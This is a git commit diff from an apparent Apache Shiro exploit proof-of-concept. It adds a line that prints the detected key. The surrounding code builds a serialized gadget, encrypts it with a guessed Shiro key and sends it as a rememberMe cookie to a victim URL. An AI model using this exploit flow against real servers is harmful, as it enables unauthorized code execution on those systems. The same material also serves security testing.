9352011016731f4b62b0b6e067297d1db72f9ec2
Center-Sun <centersun61@gmail.com>
2020-08-05 11:49:03 +0800

    add Detect Key Log and fix some bad keys

--- src/main/java/org/unicodesec/poc.java
+++ src/main/java/org/unicodesec/poc.java
@@ -81,6 +81,7 @@ public class poc {
         byte[] bytes = MakeGadget();
         String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
         HttpGet request = new HttpGet(victimUrl);
+        System.out.println(String.format("Detect key:%s",key));
         request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
         request.setHeader("Cookie", "rememberMe=" + rememberMe);
         CloseableHttpResponse response = httpclient.execute(request);
